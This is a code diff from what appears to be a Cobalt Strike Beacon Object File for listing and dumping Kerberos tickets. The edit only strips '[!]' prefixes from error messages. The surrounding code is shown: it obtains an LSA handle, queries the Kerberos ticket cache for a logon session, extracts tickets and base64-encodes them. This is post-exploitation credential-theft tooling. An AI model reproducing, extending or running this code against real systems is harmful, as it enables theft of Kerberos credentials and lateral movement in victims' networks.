@@ -17,20 +17,20 @@ void execute_klist(HANDLE hToken, LUID luid, BOOL currentLuid, BOOL dump) {
     BOOL highIntegrity = IsHighIntegrity(hToken);
 //    BOOL highIntegrity = TRUE;
     if (!highIntegrity && !currentLuid) {
-        BeaconPrintf(CALLBACK_ERROR, "[!] Not in high integrity.\n");
+        BeaconPrintf(CALLBACK_ERROR, "Not in high integrity.\n");
         return;
     }
     HANDLE hLsa;
     NTSTATUS status = GetLsaHandle(hToken, highIntegrity, &hLsa);
     if (!NT_SUCCESS(status)) {
-        BeaconPrintf(CALLBACK_ERROR, "[!] GetLsaHandle %ld\n", status);
+        BeaconPrintf(CALLBACK_ERROR, "GetLsaHandle %ld\n", status);
         return;
     }
     ULONG authPackage;
     LSA_STRING krbAuth = {.Buffer = "kerberos", .Length = 8, .MaximumLength = 9};
     status = SECUR32$LsaLookupAuthenticationPackage(hLsa, &krbAuth, &authPackage);
     if (!NT_SUCCESS(status)) {
-        BeaconPrintf(CALLBACK_ERROR, "[!] LsaLookupAuthenticationPackage %ld\n", ADVAPI32$LsaNtStatusToWinError(status));
+        BeaconPrintf(CALLBACK_ERROR, "LsaLookupAuthenticationPackage %ld\n", ADVAPI32$LsaNtStatusToWinError(status));
         SECUR32$LsaDeregisterLogonProcess(hLsa);
         return;
     }
@@ -39,7 +39,7 @@ void execute_klist(HANDLE hToken, LUID luid, BOOL currentLuid, BOOL dump) {
     status = GetLogonSessionData(luid, &sessionData);
 
     if (!NT_SUCCESS(status)) {
-        BeaconPrintf(CALLBACK_ERROR, "[!] GetLogonSessionData: %ld", status);
+        BeaconPrintf(CALLBACK_ERROR, "GetLogonSessionData: %ld", status);
         SECUR32$LsaDeregisterLogonProcess(hLsa);
         return;
     }
@@ -91,7 +91,7 @@ void execute_klist(HANDLE hToken, LUID luid, BOOL currentLuid, BOOL dump) {
         status = SECUR32$LsaCallAuthenticationPackage(hLsa, authPackage, &cacheRequest, sizeof(cacheRequest),
                                                       &cacheResponse, &responseSize, &protocolStatus);
         if (!NT_SUCCESS(status)) {
-            BeaconPrintf(CALLBACK_ERROR, "[!] LsaCallAuthenticationPackage %ld\n", ADVAPI32$LsaNtStatusToWinError(status));
+            BeaconPrintf(CALLBACK_ERROR, "LsaCallAuthenticationPackage %ld\n", ADVAPI32$LsaNtStatusToWinError(status));
             continue;
         }
         // check protocol status?
@@ -109,13 +109,13 @@ void execute_klist(HANDLE hToken, LUID luid, BOOL currentLuid, BOOL dump) {
                     ULONG ticketSize;
                     status = ExtractTicket(hLsa, authPackage, cacheRequest.LogonId, cacheInfo.ServerName, &ticket, &ticketSize);
                     if (!NT_SUCCESS(status)) {
-                        BeaconPrintf(CALLBACK_ERROR, "[!] Could not extract the ticket: %ld\n", status);
+                        BeaconPrintf(CALLBACK_ERROR, "Could not extract the ticket: %ld\n", status);
                     } else {
                         if (ticketSize > 0) {
                             int len = Base64encode_len(ticketSize);
                             char* encoded = (char*)MSVCRT$calloc(len, sizeof(char));
                             if (encoded == NULL) {
-                                BeaconPrintf(CALLBACK_ERROR, "[!] Base64 - could not allocate memory.\n");
+                                BeaconPrintf(CALLBACK_ERROR, "Base64 - could not allocate memory.\n");
                                 continue;
                             }
                             Base64encode(encoded, ticket, ticketSize);
@@ -133,7 +133,7 @@ void execute_klist(HANDLE hToken, LUID luid, BOOL currentLuid, BOOL dump) {
     }
     MSVCRT$free(sessionData.sessionData);
     SECUR32$LsaDeregisterLogonProcess(hLsa);
-//    BeaconPrintf(CALLBACK_OUTPUT, "[!] Finished klist!");
+//    BeaconPrintf(CALLBACK_OUTPUT, "Finished klist!");
 }
 
 NTSTATUS ExtractTicket(HANDLE hLsa, ULONG authPackage, LUID luid, UNICODE_STRING targetName, PUCHAR* ticket, PULONG ticketSize) {
